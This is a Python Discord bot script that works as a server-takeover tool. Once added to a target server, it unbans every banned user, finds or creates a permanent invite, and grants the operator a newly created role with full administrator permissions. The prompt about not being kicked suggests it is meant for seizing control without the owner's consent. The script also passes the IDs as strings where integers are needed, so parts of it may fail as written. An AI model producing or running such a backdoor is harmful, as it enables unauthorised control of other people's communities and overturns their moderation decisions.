import discord
from discord.ext import commands, tasks

YOUR_BOT_TOKEN = "token here!"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def get_user_id():
    while True:
        user_id = input("What's your user ID? This is to make sure you are not kicked: ")
        if user_id.isdigit() and 18 <= len(user_id) <= 19:
            return user_id
        else:
            print("Error: User ID must be a number with 18 to 19 digits. Please try again.")

def get_guild_id():
    while True:
        guild_id = input("What's the guild/server ID? ")
        if guild_id.isdigit() and 18 <= len(guild_id) <= 19:
            return guild_id
        else:
            print("Error: Guild ID must be a number with 18 to 19 digits. Please try again.")

YOUR_USER_ID = get_user_id()
TARGET_GUILD_ID = get_guild_id() 


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    
    guild = bot.get_guild(TARGET_GUILD_ID)
    
    if guild is None:
        print("Bot is not in the specified server.")
        return
    
    print(f"Connected to the target server: {guild.name}")
    
    try:
        async for ban_entry in guild.bans():
            user = ban_entry.user
            await guild.unban(user)
            print(f"Unbanned {user.name}")
    except Exception as e:
        print(f"Failed to unban users: {e}")
    
    invite_link = None
    for channel in guild.text_channels:
        try:
            invites = await channel.invites()
            if invites:
                invite_link = invites[0]  
                break
        except discord.Forbidden:
            print(f"Bot does not have permission to access invites in {channel.name}")
    
    if invite_link is None:
        print("No existing invite found. Creating a new invite...")
        try:
            invite_link = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)  
            print(f"New invite created: {invite_link.url}")
        except Exception as e:
            print(f"Failed to create a new invite: {e}")
    else:
        print(f"Existing invite found: {invite_link.url}")

    check_user_status.start(guild)

@tasks.loop(seconds=5)
async def check_user_status(guild):
    member = guild.get_member(YOUR_USER_ID)
    if member:
        print(f"User {member.name} found in the server.")
        
        role_name = "Admin Access"
        role = discord.utils.get(guild.roles, name=role_name)
        if not role:
            role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
            print(f"Created role '{role_name}' with admin permissions.")
        
        if role not in member.roles:
            await member.add_roles(role)
            print(f"Assigned role '{role_name}' to {member.name}.")
        
        check_user_status.stop()


bot.run(YOUR_BOT_TOKEN)